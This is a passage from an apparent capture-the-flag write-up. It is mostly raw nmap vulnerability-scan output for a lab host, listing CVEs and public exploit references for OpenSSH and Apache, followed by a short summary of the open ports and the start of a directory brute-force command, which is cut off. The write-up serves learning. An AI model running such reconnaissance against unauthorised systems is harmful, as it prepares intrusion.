\tMSF:ILITIES/SUSE-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/SUSE-CVE-2019-25017/\t5.8\tvulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/\t*EXPLOIT*\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-AIX-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/F5-BIG-IP-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/DEBIAN-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tEXPLOITPACK:98FE96309F9524B8C84C508837551A19\t5.8\tvulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19\t*EXPLOIT*\n|     \tEXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97\t5.8\tvulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97\t*EXPLOIT*\n|     \tEDB-ID:46516\t5.8\tvulners.com/exploitdb/EDB-ID:46516\t*EXPLOIT*\n|     \tEDB-ID:46193\t5.8\tvulners.com/exploitdb/EDB-ID:46193\t*EXPLOIT*\n|     \tCVE-2019-6111\t5.8\tvulners.com/cve/CVE-2019-6111\n|     \t1337DAY-ID-32328\t5.8\tvulners.com/zdt/1337DAY-ID-32328\t*EXPLOIT*\n|     \t1337DAY-ID-32009\t5.8\tvulners.com/zdt/1337DAY-ID-32009\t*EXPLOIT*\n|     \tSSV:91041\t5.5\tvulners.com/seebug/SSV:91041\t*EXPLOIT*\n|     \tPACKETSTORM:140019\t5.5\tvulners.com/packetstorm/PACKETSTORM:140019\t*EXPLOIT*\n|     \tPACKETSTORM:136234\t5.5\tvulners.com/packetstorm/PACKETSTORM:136234\t*EXPLOIT*\n|     \tEXPLOITPACK:F92411A645D85F05BDBD274FD222226F\t5.5\tvulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BDBD274FD222226F\t*EXPLOIT*\n|     \tEXPLOITPACK:9F2E746846C3C623A27A441281EAD138\t5.5\tvulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138\t*EXPLOIT*\n|     \tEXPLOITPACK:1902C998CBF9154396911926B4C3B330\t5.5\tvulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330\t*EXPLOIT*\n|     \tEDB-ID:40858\t5.5\tvulners.com/exploitdb/EDB-ID:40858\t*EXPLOIT*\n|     \tEDB-ID:40119\t5.5\tvulners.com/exploitdb/EDB-ID:40119\t*EXPLOIT*\n|     \tEDB-ID:39569\t5.5\tvulners.com/exploitdb/EDB-ID:39569\t*EXPLOIT*\n|     \tCVE-2016-3115\t5.5\tvulners.com/cve/CVE-2016-3115\n|     \tSSH_ENUM\t5.0\tvulners.com/canvas/SSH_ENUM\t*EXPLOIT*\n|     \tPACKETSTORM:150621\t5.0\tvulners.com/packetstorm/PACKETSTORM:150621\t*EXPLOIT*\n|     \tMSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS\t5.0\tvulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS\t*EXPLOIT*\n|     \tEXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0\t5.0\tvulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0\t*EXPLOIT*\n|     \tEXPLOITPACK:EBDBC5685E3276D648B4D14B75563283\t5.0\tvulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283\t*EXPLOIT*\n|     \tEDB-ID:45939\t5.0\tvulners.com/exploitdb/EDB-ID:45939\t*EXPLOIT*\n|     \tEDB-ID:45233\t5.0\tvulners.com/exploitdb/EDB-ID:45233\t*EXPLOIT*\n|     \tCVE-2018-15919\t5.0\tvulners.com/cve/CVE-2018-15919\n|     \tCVE-2018-15473\t5.0\tvulners.com/cve/CVE-2018-15473\n|     \tCVE-2017-15906\t5.0\tvulners.com/cve/CVE-2017-15906\n|     \tCVE-2016-10708\t5.0\tvulners.com/cve/CVE-2016-10708\n|     \t1337DAY-ID-31730\t5.0\tvulners.com/zdt/1337DAY-ID-31730\t*EXPLOIT*\n|     \tCVE-2021-41617\t4.4\tvulners.com/cve/CVE-2021-41617\n|     \tMSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/\t4.3\tvulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/\t4.3\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/\t4.3\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/\t4.3\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/F5-BIG-IP-CVE-2020-14145/\t4.3\tvulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/\t*EXPLOIT*\n|     \tEXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF\t4.3\tvulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF\t*EXPLOIT*\n|     \tEXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF\t4.3\tvulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF\t*EXPLOIT*\n|     \tEDB-ID:40136\t4.3\tvulners.com/exploitdb/EDB-ID:40136\t*EXPLOIT*\n|     \tEDB-ID:40113\t4.3\tvulners.com/exploitdb/EDB-ID:40113\t*EXPLOIT*\n|     \tCVE-2020-14145\t4.3\tvulners.com/cve/CVE-2020-14145\n|     \tCVE-2016-6210\t4.3\tvulners.com/cve/CVE-2016-6210\n|     \t1337DAY-ID-25440\t4.3\tvulners.com/zdt/1337DAY-ID-25440\t*EXPLOIT*\n|     \t1337DAY-ID-25438\t4.3\tvulners.com/zdt/1337DAY-ID-25438\t*EXPLOIT*\n|     \tCVE-2019-6110\t4.0\tvulners.com/cve/CVE-2019-6110\n|     \tCVE-2019-6109\t4.0\tvulners.com/cve/CVE-2019-6109\n|     \tCVE-2018-20685\t2.6\tvulners.com/cve/CVE-2018-20685\n|     \tSSV:92581\t2.1\tvulners.com/seebug/SSV:92581\t*EXPLOIT*\n|     \tCVE-2016-10011\t2.1\tvulners.com/cve/CVE-2016-10011\n|     \tSRC-2016-0002\t0.0\tvulners.com/srcincite/SRC-2016-0002\t*EXPLOIT*\n|     \tPACKETSTORM:151227\t0.0\tvulners.com/packetstorm/PACKETSTORM:151227\t*EXPLOIT*\n|     \tPACKETSTORM:140261\t0.0\tvulners.com/packetstorm/PACKETSTORM:140261\t*EXPLOIT*\n|     \tPACKETSTORM:138006\t0.0\tvulners.com/packetstorm/PACKETSTORM:138006\t*EXPLOIT*\n|     \tPACKETSTORM:137942\t0.0\tvulners.com/packetstorm/PACKETSTORM:137942\t*EXPLOIT*\n|_    \t1337DAY-ID-30937\t0.0\tvulners.com/zdt/1337DAY-ID-30937\t*EXPLOIT*\n80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))\n| http-enum: \n|_  /protected/: Potentially interesting folder (401 Unauthorized)\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.\n|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.\n| vulners: \n|   cpe:/a:apache:http_server:2.4.18: \n|     \tCVE-2021-44790\t7.5\tvulners.com/cve/CVE-2021-44790\n|     \tCVE-2021-39275\t7.5\tvulners.com/cve/CVE-2021-39275\n|     \tCVE-2021-26691\t7.5\tvulners.com/cve/CVE-2021-26691\n|     \tCVE-2017-7679\t7.5\tvulners.com/cve/CVE-2017-7679\n|     \tCVE-2017-7668\t7.5\tvulners.com/cve/CVE-2017-7668\n|     \tCVE-2017-3169\t7.5\tvulners.com/cve/CVE-2017-3169\n|     \tCVE-2017-3167\t7.5\tvulners.com/cve/CVE-2017-3167\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/\t7.2\tvulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/\t7.2\tvulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/\t*EXPLOIT*\n|     \tEXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB\t7.2\tvulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB\t*EXPLOIT*\n|     \tEDB-ID:46676\t7.2\tvulners.com/exploitdb/EDB-ID:46676\t*EXPLOIT*\n|     \tCVE-2019-0211\t7.2\tvulners.com/cve/CVE-2019-0211\n|     \t1337DAY-ID-32502\t7.2\tvulners.com/zdt/1337DAY-ID-32502\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1312/\t6.8\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/SUSE-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/\t6.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/\t6.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/\t6.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/FREEBSD-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/DEBIAN-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/\t6.8\tvulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     \tFDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8\t6.8\tvulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8\t*EXPLOIT*\n|     \tCVE-2021-40438\t6.8\tvulners.com/cve/CVE-2021-40438\n|     \tCVE-2020-35452\t6.8\tvulners.com/cve/CVE-2020-35452\n|     \tCVE-2018-1312\t6.8\tvulners.com/cve/CVE-2018-1312\n|     \tCVE-2017-15715\t6.8\tvulners.com/cve/CVE-2017-15715\n|     \t4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332\t6.8\tvulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332\t*EXPLOIT*\n|     \tCVE-2021-44224\t6.4\tvulners.com/cve/CVE-2021-44224\n|     \tCVE-2019-10082\t6.4\tvulners.com/cve/CVE-2019-10082\n|     \tCVE-2017-9788\t6.4\tvulners.com/cve/CVE-2017-9788\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/\t6.0\tvulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/\t6.0\tvulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/\t*EXPLOIT*\n|     \tCVE-2019-0217\t6.0\tvulners.com/cve/CVE-2019-0217\n|     \tCVE-2020-1927\t5.8\tvulners.com/cve/CVE-2020-1927\n|     \tCVE-2019-10098\t5.8\tvulners.com/cve/CVE-2019-10098\n|     \t1337DAY-ID-33577\t5.8\tvulners.com/zdt/1337DAY-ID-33577\t*EXPLOIT*\n|     \tCVE-2016-5387\t5.1\tvulners.com/cve/CVE-2016-5387\n|     \tSSV:96537\t5.0\tvulners.com/seebug/SSV:96537\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1333/\t5.0\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1333/\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1303/\t5.0\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1303/\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2017-15710/\t5.0\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/\t5.0\tvulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/\t5.0\tvulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/\t5.0\tvulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/\t5.0\tvulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/\t5.0\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/\t5.0\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/\t5.0\tvulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED\t5.0\tvulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED\t*EXPLOIT*\n|     \tEXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D\t5.0\tvulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D\t*EXPLOIT*\n|     \tEXPLOITPACK:2666FB0676B4B582D689921651A30355\t5.0\tvulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355\t*EXPLOIT*\n|     \tEDB-ID:42745\t5.0\tvulners.com/exploitdb/EDB-ID:42745\t*EXPLOIT*\n|     \tEDB-ID:40909\t5.0\tvulners.com/exploitdb/EDB-ID:40909\t*EXPLOIT*\n|     \tCVE-2021-34798\t5.0\tvulners.com/cve/CVE-2021-34798\n|     \tCVE-2021-33193\t5.0\tvulners.com/cve/CVE-2021-33193\n|     \tCVE-2021-26690\t5.0\tvulners.com/cve/CVE-2021-26690\n|     \tCVE-2020-1934\t5.0\tvulners.com/cve/CVE-2020-1934\n|     \tCVE-2019-17567\t5.0\tvulners.com/cve/CVE-2019-17567\n|     \tCVE-2019-0220\t5.0\tvulners.com/cve/CVE-2019-0220\n|     \tCVE-2019-0196\t5.0\tvulners.com/cve/CVE-2019-0196\n|     \tCVE-2018-17199\t5.0\tvulners.com/cve/CVE-2018-17199\n|     \tCVE-2018-17189\t5.0\tvulners.com/cve/CVE-2018-17189\n|     \tCVE-2018-1333\t5.0\tvulners.com/cve/CVE-2018-1333\n|     \tCVE-2018-1303\t5.0\tvulners.com/cve/CVE-2018-1303\n|     \tCVE-2017-9798\t5.0\tvulners.com/cve/CVE-2017-9798\n|     \tCVE-2017-15710\t5.0\tvulners.com/cve/CVE-2017-15710\n|     \tCVE-2016-8743\t5.0\tvulners.com/cve/CVE-2016-8743\n|     \tCVE-2016-8740\t5.0\tvulners.com/cve/CVE-2016-8740\n|     \tCVE-2016-4979\t5.0\tvulners.com/cve/CVE-2016-4979\n|     \t1337DAY-ID-28573\t5.0\tvulners.com/zdt/1337DAY-ID-28573\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/\t4.9\tvulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/\t*EXPLOIT*\n|     \tCVE-2019-0197\t4.9\tvulners.com/cve/CVE-2019-0197\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1302/\t4.3\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1302/\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1301/\t4.3\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1301/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/\t4.3\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/\t*EXPLOIT*\n|     \tMSF:ILITIES/DEBIAN-CVE-2019-10092/\t4.3\tvulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-10092/\t*EXPLOIT*\n|     \tMSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/\t4.3\tvulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/\t*EXPLOIT*\n|     \tMSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/\t4.3\tvulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/\t*EXPLOIT*\n|     \tCVE-2020-11985\t4.3\tvulners.com/cve/CVE-2020-11985\n|     \tCVE-2019-10092\t4.3\tvulners.com/cve/CVE-2019-10092\n|     \tCVE-2018-1302\t4.3\tvulners.com/cve/CVE-2018-1302\n|     \tCVE-2018-1301\t4.3\tvulners.com/cve/CVE-2018-1301\n|     \tCVE-2018-11763\t4.3\tvulners.com/cve/CVE-2018-11763\n|     \tCVE-2016-4975\t4.3\tvulners.com/cve/CVE-2016-4975\n|     \tCVE-2016-1546\t4.3\tvulners.com/cve/CVE-2016-1546\n|     \t4013EC74-B3C1-5D95-938A-54197A58586D\t4.3\tvulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D\t*EXPLOIT*\n|     \t1337DAY-ID-33575\t4.3\tvulners.com/zdt/1337DAY-ID-33575\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1283/\t3.5\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/\t3.5\tvulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/\t3.5\tvulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/\t3.5\tvulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/\t3.5\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/\t3.5\tvulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/\t*EXPLOIT*\n|     \tCVE-2018-1283\t3.5\tvulners.com/cve/CVE-2018-1283\n|     \tCVE-2016-8612\t3.3\tvulners.com/cve/CVE-2016-8612\n|     \tPACKETSTORM:152441\t0.0\tvulners.com/packetstorm/PACKETSTORM:152441\t*EXPLOIT*\n|_    \tMSF:EXPLOIT/UNIX/WEBAPP/JOOMLA_MEDIA_UPLOAD_EXEC/\t0.0\tvulners.com/metasploit/MSF:EXPLOIT/UNIX/WEBAPP/JOOMLA_MEDIA_UPLOAD_EXEC/\t*EXPLOIT*\n|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.\n1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1\n|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.\n| http-enum: \n|   /examples/: Sample scripts\n|   /manager/html/upload: Apache Tomcat (401 Unauthorized)\n|   /manager/html: Apache Tomcat (401 Unauthorized)\n|_  /docs/: Potentially interesting folder\n|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.\n|_http-server-header: Apache-Coyote/1.1\n|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.\n8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)\nNo exact OS matches for host (If you know what OS is running on it, see nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.92%E=4%D=1/30%OT=22%CT=1%CU=32123%PV=Y%DS=4%DC=T%G=Y%TM=61F71BC\nOS:5%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10F%TI=Z%TS=8)SEQ(SP=104%GC\nOS:D=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3=M50\nOS:6NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=68DF%W2=68DF%\nOS:W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW7%CC\nOS:=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T\nOS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=\nOS:0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=\nOS:Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=\nOS:G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nUptime guess: 0.019 days (since Sun Jan 30 15:47:12 2022)\nNetwork Distance: 4 hops\nTCP Sequence Prediction: Difficulty=261 (Good luck!)\nIP ID Sequence Generation: All zeros\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 443/tcp)\nHOP RTT       ADDRESS\n1   29.74 ms  10.13.0.1\n2   ... 3\n4   171.05 ms 10.10.28.154\n\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at nmap.org/submit/ .\n# Nmap done at Sun Jan 30 16:14:13 2022 -- 1 IP address (1 host up) scanned in 1300.33 seconds\n\nSo, we’ve got the following ports:\n\n22: OpenSSH (Nmap says it’s 7.2p2, but connecting to it directly reveals it to be 8.7p1)\n80: Apache httpd 2.4.18\n1234: Apache Tomcat + Coyote 1.1\n8009: Apache Jserv 1.3\n\nThere’s a hidden /protected/ directory on port 80 that seems to be password-protected.\nNo obvious exploits here.\nWe’ll also run a scan with dirbuster (normally I use gobuster, but I’m trying to operate in the spirit of this CTF):\ndirbuster \\\n\t-l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\\n\t-u 